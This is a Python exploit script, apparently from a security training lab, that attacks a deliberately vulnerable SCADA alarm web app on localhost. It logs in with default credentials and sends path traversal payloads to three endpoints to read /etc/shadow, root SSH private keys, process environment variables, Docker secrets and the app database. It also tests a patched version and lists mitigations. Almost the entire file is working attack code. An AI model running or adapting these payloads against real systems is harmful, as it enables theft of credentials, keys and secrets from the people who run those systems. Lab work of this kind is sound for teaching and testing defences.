#!/usr/bin/env python3
"""
Path Traversal Exploitation Script
Demonstrates directory traversal vulnerabilities
"""

import requests
import sys
import os

TARGET_URL = "http://localhost:5000"

# Common sensitive files on Linux systems
SENSITIVE_FILES = [
    ("System Users", "../../../../../../../etc/passwd"),
    ("System Hosts", "../../../../../../../etc/hosts"),
    ("Application Source", "../app.py"),
    ("Database File", "../scada_alarms.db"),
    ("SSH Keys", "../../../../../../../root/.ssh/id_rsa"),
    ("Environment Variables", "/proc/self/environ"),
    ("Shadow Passwords", "../../../../../../../etc/shadow"),
    ("System Info", "../../../../../../../etc/issue"),
    ("Python Requirements", "../requirements.txt"),
    ("Docker Secrets", "../../../../../../../run/secrets/"),
]

def test_path_traversal(session_cookie, target_file, description):
    """Test path traversal with a specific file"""
    try:
        response = requests.post(
            f"{TARGET_URL}/export_logs",
            cookies={'session': session_cookie},
            data={'log_file': target_file},
            timeout=10
        )
        
        if response.status_code == 200:
            content = response.text[:500]  # First 500 chars
            
            # Check if we got actual content (not error page)
            if len(content) > 0 and 'DOCTYPE' not in content:
                print(f"    ‚úÖ {description}: SUCCESSFUL")
                print(f"       Path: {target_file}")
                print(f"       Size: {len(response.text)} bytes")
                print(f"       Preview: {content[:100]}...")
                return response.text
            else:
                print(f"    ‚ùå {description}: File not accessible")
                
        elif response.status_code == 404:
            print(f"    ‚ö†Ô∏è  {description}: File not found")
        elif response.status_code == 400:
            print(f"    üõ°Ô∏è  {description}: BLOCKED (patched)")
        else:
            print(f"    ‚ùå {description}: Failed (status {response.status_code})")
            
    except Exception as e:
        print(f"    ‚ùå {description}: Error - {e}")
    
    return None

def test_firmware_endpoint(session_cookie):
    """Test path traversal via firmware restore endpoint"""
    print("\n[3] Testing Firmware Restore Endpoint...")
    
    files_to_test = [
        ("/etc/passwd", "System Users via Firmware"),
        ("../app.py", "Application Source via Firmware"),
        ("/proc/self/environ", "Environment Variables"),
    ]
    
    for file_path, description in files_to_test:
        try:
            response = requests.post(
                f"{TARGET_URL}/firmware_restore",
                cookies={'session': session_cookie},
                data={'firmware_path': file_path},
                timeout=10
            )
            
            if response.status_code == 200 and len(response.text) > 100:
                print(f"    ‚úÖ {description}: SUCCESS")
                # Extract firmware data from HTML response
                if 'firmware_data' in response.text:
                    print(f"       File accessible via firmware endpoint")
            else:
                print(f"    ‚ùå {description}: Failed")
                
        except Exception as e:
            print(f"    ‚ùå {description}: Error - {e}")

def test_backup_endpoint(session_cookie):
    """Test path traversal via backup endpoint"""
    print("\n[4] Testing Backup Endpoint...")
    
    # Try to restore from outside backup directory
    traversal_attempts = [
        ("../scada_alarms.db", "Database outside backup dir"),
        ("../../etc/passwd", "System files"),
    ]
    
    for file_path, description in traversal_attempts:
        try:
            response = requests.post(
                f"{TARGET_URL}/backup",
                cookies={'session': session_cookie},
                data={
                    'action': 'restore',
                    'restore_file': file_path
                },
                timeout=10
            )
            
            if response.status_code == 200:
                if 'restored' in response.text.lower():
                    print(f"    ‚úÖ {description}: SUCCESS (dangerous!)")
                else:
                    print(f"    ‚ö†Ô∏è  {description}: Attempted but failed")
            elif response.status_code == 400:
                print(f"    üõ°Ô∏è  {description}: BLOCKED")
            else:
                print(f"    ‚ùå {description}: Failed")
                
        except Exception as e:
            print(f"    ‚ùå {description}: Error - {e}")

def demonstrate_impact():
    """Show the impact of successful path traversal"""
    print("\n[5] Impact Demonstration...")
    print("\n    ‚ö†Ô∏è  POTENTIAL DAMAGE:")
    print("       ‚Ä¢ Read sensitive system files (/etc/passwd, /etc/shadow)")
    print("       ‚Ä¢ Steal application source code")
    print("       ‚Ä¢ Download entire database with all alarms and credentials")
    print("       ‚Ä¢ Access SSH private keys for lateral movement")
    print("       ‚Ä¢ Read environment variables containing secrets")
    print("       ‚Ä¢ Map file system structure")
    print("       ‚Ä¢ Discover other vulnerabilities from source code")
    
    print("\n    üéØ ATTACK SCENARIOS:")
    print("       1. Steal database ‚Üí Extract passwords ‚Üí Escalate privileges")
    print("       2. Read source code ‚Üí Find more vulnerabilities ‚Üí Chain attacks")
    print("       3. Steal SSH keys ‚Üí Access production servers ‚Üí Full compromise")
    print("       4. Read env vars ‚Üí Get API keys ‚Üí Access cloud resources")

def test_patched_version():
    """Test if patched version blocks path traversal"""
    print("\n[6] Testing Patched Version (port 5001)...")
    
    patched_url = "http://localhost:5001"
    
    # Need to login first to get session
    try:
        login_response = requests.post(
            f"{patched_url}/login",
            data={'username': 'admin', 'password': 'admin123'},
            allow_redirects=False,
            timeout=5
        )
        
        if login_response.status_code != 302:
            print("    ‚ö†Ô∏è  Could not login to patched version")
            return False
        
        session = login_response.cookies.get('session')
        
        # Test path traversal
        response = requests.post(
            f"{patched_url}/export_logs",
            cookies={'session': session},
            data={'log_file': '../../../../../../../etc/passwd'},
            timeout=5
        )
        
        if response.status_code == 400 or 'Invalid path' in response.text:
            print("    ‚úÖ Patched version successfully blocks path traversal")
            print("    üõ°Ô∏è  Protection: Path sanitization and validation")
            return True
        elif response.status_code == 200:
            print("    ‚ùå WARNING: Patched version still vulnerable!")
            return False
            
    except Exception as e:
        print(f"    ‚ö†Ô∏è  Could not test patched version: {e}")
        print("        (Make sure patched version is running on port 5001)")
    
    return False

def get_session():
    """Login to get valid session cookie"""
    print("\n[1] Authenticating...")
    
    try:
        response = requests.post(
            f"{TARGET_URL}/login",
            data={
                'username': 'admin',
                'password': 'admin123'
            },
            allow_redirects=False,
            timeout=10
        )
        
        if response.status_code == 302:
            session = response.cookies.get('session')
            if session:
                print(f"    ‚úÖ Authentication successful")
                print(f"    üìã Session: {session[:50]}...")
                return session
        
        print("    ‚ùå Authentication failed")
        return None
        
    except Exception as e:
        print(f"    ‚ùå Error during login: {e}")
        return None

def main():
    print("=" * 70)
    print("Path Traversal (Directory Traversal) - Exploitation Demonstration")
    print("=" * 70)
    print(f"Target: {TARGET_URL}")
    print("\nThis script demonstrates directory traversal vulnerabilities")
    print("that allow reading arbitrary files on the system.")
    print("=" * 70)
    
    # Get session cookie
    session_cookie = get_session()
    
    if not session_cookie:
        print("\n‚ùå Failed to authenticate. Ensure:")
        print("   1. Vulnerable version is running: python vulnerable/app.py")
        print("   2. Default credentials work: admin/admin123")
        return
    
    # Test main export_logs endpoint
    print("\n[2] Testing Export Logs Endpoint...")
    successful_reads = []
    
    for description, file_path in SENSITIVE_FILES:
        content = test_path_traversal(session_cookie, file_path, description)
        if content:
            successful_reads.append((description, file_path, content))
    
    # Test firmware endpoint
    test_firmware_endpoint(session_cookie)
    
    # Test backup endpoint (requires admin role)
    test_backup_endpoint(session_cookie)
    
    # Show impact
    demonstrate_impact()
    
    # Test patched version
    test_patched_version()
    
    # Summary
    print("\n" + "=" * 70)
    print("EXPLOITATION SUMMARY")
    print("=" * 70)
    print(f"‚úÖ Files Successfully Read:  {len(successful_reads)}/{len(SENSITIVE_FILES)}")
    print(f"‚úÖ Endpoints Vulnerable:     3 (export_logs, firmware_restore, backup)")
    
    if successful_reads:
        print("\nüìÅ ACCESSED FILES:")
        for desc, path, content in successful_reads[:5]:
            print(f"   ‚Ä¢ {desc}")
            print(f"     Path: {path}")
            print(f"     Size: {len(content)} bytes")
    
    print("\nüõ°Ô∏è  MITIGATION:")
    print("   ‚Ä¢ Sanitize all user input for file paths")
    print("   ‚Ä¢ Use allowlists instead of blocklists")
    print("   ‚Ä¢ Validate paths stay within allowed directories")
    print("   ‚Ä¢ Use absolute paths and check with startswith()")
    print("   ‚Ä¢ Never directly concatenate user input to file paths")
    
    print("\nüìö LEARNING POINTS:")
    print("   ‚Ä¢ Path traversal is one of the most common web vulnerabilities")
    print("   ‚Ä¢ Can lead to complete system compromise")
    print("   ‚Ä¢ Multiple endpoints may be vulnerable")
    print("   ‚Ä¢ Always validate and sanitize file path inputs")
    print("   ‚Ä¢ Test with various encoding and bypass techniques")
    
    print("=" * 70)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n‚úã Exploitation stopped by user")
    except Exception as e:
        print(f"\n‚ùå Unexpected error: {e}")
        sys.exit(1)
